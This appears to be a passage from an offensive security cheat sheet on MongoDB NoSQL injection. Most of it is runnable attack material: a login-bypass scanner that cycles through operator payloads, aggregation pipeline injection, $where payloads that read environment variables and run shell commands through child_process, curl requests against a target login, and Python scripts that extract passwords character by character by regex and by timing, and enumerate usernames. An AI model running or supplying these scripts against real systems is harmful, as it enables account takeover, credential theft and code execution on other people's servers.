---

## Automated NoSQL Detection Script

```python
#!/usr/bin/env python3
"""Automated NoSQL injection detection testing all operator variants."""
import requests
import json
import sys
import urllib.parse

def test_nosqli(url, method="POST", content_type="json", cookies=None):
    """Test for NoSQL injection across multiple operator and syntax variants."""
    results = []
    headers = {"User-Agent": "Mozilla/5.0"}

    # Operator injection payloads (JSON body)
    json_payloads = [
        ("$ne bypass", {"username": "admin", "password": {"$ne": ""}}),
        ("$gt bypass", {"username": "admin", "password": {"$gt": ""}}),
        ("$regex wildcard", {"username": "admin", "password": {"$regex": ".*"}}),
        ("$regex prefix", {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}),
        ("$exists check", {"username": "admin", "password": {"$exists": True}}),
        ("$in bypass", {"username": "admin", "password": {"$in": ["", "password", "admin", "123456"]}}),
        ("$where true", {"username": "admin", "$where": "1==1"}),
        ("$where js", {"username": "admin", "$where": "this.password.length > 0"}),
        ("$or bypass", {"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$ne": ""}}),
        ("$nin bypass", {"username": "admin", "password": {"$nin": []}}),
    ]

    # URL-encoded operator injection (form data)
    form_payloads = [
        ("URL $ne", {"username": "admin", "password[$ne]": ""}),
        ("URL $gt", {"username": "admin", "password[$gt]": ""}),
        ("URL $regex", {"username": "admin", "password[$regex]": ".*"}),
        ("URL $exists", {"username": "admin", "password[$exists]": "true"}),
        ("URL $in", {"username": "admin", "password[$in][]": ""}),
        ("URL $or", {"$or[0][username]": "admin", "$or[1][username]": "administrator", "password[$ne]": ""}),
    ]

    # Syntax injection payloads (string values)
    syntax_payloads = [
        ("Always true", "' || 1 || '"),
        ("Always true (alt)", "' || '1'=='1"),
        ("Comment bypass", "admin'//"),
        ("JS injection", "admin'; return true; var x='"),
    ]

    # Get baseline response
    baseline = None
    try:
        if content_type == "json":
            baseline = requests.post(url, json={"username": "admin", "password": "wrongpassword"},
                                    headers={**headers, "Content-Type": "application/json"},
                                    cookies=cookies, timeout=10, allow_redirects=False)
        else:
            baseline = requests.post(url, data={"username": "admin", "password": "wrongpassword"},
                                    headers=headers, cookies=cookies, timeout=10, allow_redirects=False)
    except Exception:
        pass

    baseline_len = len(baseline.text) if baseline else 0
    baseline_status = baseline.status_code if baseline else 0

    # Test JSON operator injection
    if content_type == "json":
        for name, payload in json_payloads:
            try:
                r = requests.post(url, json=payload,
                                 headers={**headers, "Content-Type": "application/json"},
                                 cookies=cookies, timeout=10, allow_redirects=False)
                if _is_success(r, baseline_status, baseline_len):
                    results.append(f"[JSON] {name}: HTTP {r.status_code} (len={len(r.text)})")
            except Exception as e:
                pass

    # Test URL-encoded operator injection
    for name, payload in form_payloads:
        try:
            r = requests.post(url, data=payload, headers=headers,
                             cookies=cookies, timeout=10, allow_redirects=False)
            if _is_success(r, baseline_status, baseline_len):
                results.append(f"[FORM] {name}: HTTP {r.status_code} (len={len(r.text)})")
        except Exception:
            pass

    return results

def _is_success(response, baseline_status, baseline_len):
    """Detect if injection succeeded by comparing to baseline."""
    if response.status_code != baseline_status:
        return response.status_code in [200, 302]
    if abs(len(response.text) - baseline_len) > 50:
        return len(response.text) > baseline_len
    return False

if __name__ == "__main__":
    target = sys.argv[1]
    ct = sys.argv[2] if len(sys.argv) > 2 else "json"
    print(f"[*] Testing NoSQL injection at {target} (content-type: {ct})")
    findings = test_nosqli(target, content_type=ct)
    for f in findings:
        print(f"  [+] {f}")
    if not findings:
        print("  [-] No NoSQL injection detected")
```

---

## Aggregation Pipeline Injection

If the application uses MongoDB aggregation pipelines with user input:

### $lookup Cross-Collection Data Access
```json
// If user input is injected into aggregation pipeline stages:
[{"$lookup": {
    "from": "users",
    "localField": "_id",
    "foreignField": "_id",
    "as": "stolen_data"
}}]

// Inject into $match stage:
{"$match": {"$or": [{"role": "admin"}, {"role": {"$exists": true}}]}}
```

### $match Pipeline Injection
```json
// Normal: db.products.aggregate([{$match: {category: USER_INPUT}}])
// Inject:
{"category": {"$ne": null}}
// Returns all products regardless of category

// With $group to enumerate:
[{"$match": {}}, {"$group": {"_id": "$category", "count": {"$sum": 1}}}]
```

### $addFields Injection
```json
// Inject computed fields to extract data:
[{"$addFields": {"leaked_field": "$password"}}]
```

---

## mapReduce Exploitation

MongoDB's `mapReduce` and `$where` execute arbitrary JavaScript:

### $where JavaScript Execution
```json
// Authentication bypass via JS
{"$where": "function() { return true; }"}
{"$where": "1 == 1"}

// Sleep-based blind detection
{"$where": "sleep(5000)"}
{"$where": "function() { sleep(5000); return true; }"}

// Data exfiltration via timing
{"$where": "if (this.password[0] == 'a') { sleep(5000); } return true;"}
```

### mapReduce Command Injection
```javascript
// If mapReduce is accessible:
db.runCommand({
    mapReduce: "users",
    map: function() { emit(this._id, this.password); },
    reduce: function(key, values) { return values.join(','); },
    out: "exfiltrated"
});

// Then read from exfiltrated collection
db.exfiltrated.find()
```

### Server-Side JavaScript (SSJS)
```json
// Via $where with full JS access:
{"$where": "this.constructor.constructor('return process.env')()"}
{"$where": "this.constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()"}
```

---

## JSON/BSON Type Confusion

### URL-Encoded vs JSON Operator Injection

Some applications parse URL-encoded bodies but allow object nesting:

```
# URL-encoded form body (Content-Type: application/x-www-form-urlencoded)
username=admin&password[$ne]=

# The server may parse this as:
{"username": "admin", "password": {"$ne": ""}}
```

### Array Injection
```
# URL-encoded arrays:
username=admin&password[$in][]=password1&password[$in][]=password2

# Parsed as:
{"username": "admin", "password": {"$in": ["password1", "password2"]}}
```

### Content-Type Switching
```bash
# If the endpoint accepts JSON, try sending operators in JSON even if the form uses URL encoding:
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# Also try with different content types:
curl -X POST http://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password[$ne]='
```

### Integer Type Confusion
```json
// If a field expects string but receives int/bool:
{"username": "admin", "password": true}
{"username": "admin", "password": 1}
{"username": {"$eq": "admin"}, "password": {"$ne": null}}
```

---

## Blind Data Extraction — Character-by-Character

### Regex-Based Extraction Script
```python
#!/usr/bin/env python3
"""Extract data character by character from NoSQL injection using $regex."""
import requests
import string
import sys

def extract_field(url, known_username, field="password", content_type="json"):
    """Extract a field value character by character using $regex."""
    extracted = ""
    charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_{}-!@#$%^&*()"

    for position in range(64):  # Max 64 chars
        found = False
        for c in charset:
            # Escape regex special chars
            escaped = extracted + re.escape(c) if c in r'\.^$*+?{}[]|()' else extracted + c

            if content_type == "json":
                payload = {
                    "username": known_username,
                    field: {"$regex": f"^{escaped}"}
                }
                r = requests.post(url, json=payload, timeout=10, allow_redirects=False)
            else:
                payload = {
                    "username": known_username,
                    f"{field}[$regex]": f"^{escaped}"
                }
                r = requests.post(url, data=payload, timeout=10, allow_redirects=False)

            if r.status_code == 200 or (r.status_code == 302 and "login" not in r.headers.get("Location", "")):
                extracted += c
                print(f"[+] Found: {extracted}")
                found = True
                break

        if not found:
            break

    return extracted

import re

if __name__ == "__main__":
    url = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else "admin"
    print(f"[*] Extracting password for '{username}' from {url}")
    password = extract_field(url, username)
    print(f"[+] Extracted: {password}")
```

### Username Enumeration via $regex
```python
#!/usr/bin/env python3
"""Enumerate valid usernames using $regex NoSQL injection."""
import requests
import string

def enumerate_users(url, content_type="json"):
    """Find valid usernames by testing character prefixes."""
    users = []

    def check_prefix(prefix):
        if content_type == "json":
            payload = {"username": {"$regex": f"^{prefix}"}, "password": {"$ne": ""}}
            r = requests.post(url, json=payload, timeout=10, allow_redirects=False)
        else:
            payload = {"username[$regex]": f"^{prefix}", "password[$ne]": ""}
            r = requests.post(url, data=payload, timeout=10, allow_redirects=False)
        return r.status_code == 200 or r.status_code == 302

    # Find first characters
    for c in string.ascii_lowercase:
        if check_prefix(c):
            # Extend to find full username
            username = c
            while True:
                found = False
                for next_c in string.ascii_lowercase + string.digits + "_-.":
                    if check_prefix(username + next_c):
                        username += next_c
                        found = True
                        break
                if not found:
                    break
            users.append(username)
            print(f"[+] Found user: {username}")

    return users
```

### $where Timing-Based Extraction
```python
import requests
import time
import string

def extract_via_timing(url, field="password"):
    """Extract data using $where timing-based blind injection."""
    extracted = ""

    for pos in range(64):
        found = False
        for c in string.printable.strip():
            payload = {
                "username": "admin",
                "$where": f"if(this.{field}[{pos}]=='{c}'){{sleep(2000);return true;}}return false;"
            }
            start = time.time()
            try:
                requests.post(url, json=payload, timeout=5)
            except requests.Timeout:
                pass
            elapsed = time.time() - start

            if elapsed >= 1.5:
                extracted += c
                print(f"[+] Position {pos}: '{c}' (total: {extracted})")
                found = True
                break

        if not found:
            break

    return extracted
```
